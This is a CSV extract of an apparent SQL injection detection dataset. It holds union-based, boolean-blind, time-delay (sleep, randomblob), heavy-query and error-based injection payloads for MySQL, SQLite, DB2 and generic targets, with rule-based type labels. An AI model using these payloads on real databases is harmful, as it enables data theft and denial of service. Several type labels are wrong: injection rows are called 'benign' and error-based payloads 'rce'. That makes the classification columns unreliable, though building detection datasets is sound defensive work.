row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2400,1'+ ( select 'yjpp' where 8966 = 8966,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2401,"1%"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
2402,"-8266%' ) union all select 8626,8626,8626,8626,8626,8626--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2403,"1%' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
2404,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2405,"-6359"" ) ) or elt ( 3546 = 2433,2433 ) and ( ( ""qxat"" = ""qxat",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2406,"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""rfpq"" = ""rfpq",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2407,1 ) ) ) and 6358 = 6735,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2408,1' ) ) as cimd where 9608 = 9608,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2409,"1' ) as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
2410,1'+ ( select 'sbji' where 7989 = 7989 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2411,-9690 union all select 7217#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2412,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) -- dkwz",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2413,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eomt' = 'eomt",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2414,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'thce' = 'thce",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2415,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'lajk' = 'lajk,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2416,1' ) where 1212 = 1212,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2417,"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",1,,boolean_blind,generic,0.95,4932 = 4932 or detected — boolean_blind injection (priority 8) on generic,rule-based
2418,1' ) ) ) and ( 1685 = 2985 ) *2985 and ( ( ( 'rzwb' = 'rzwb,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
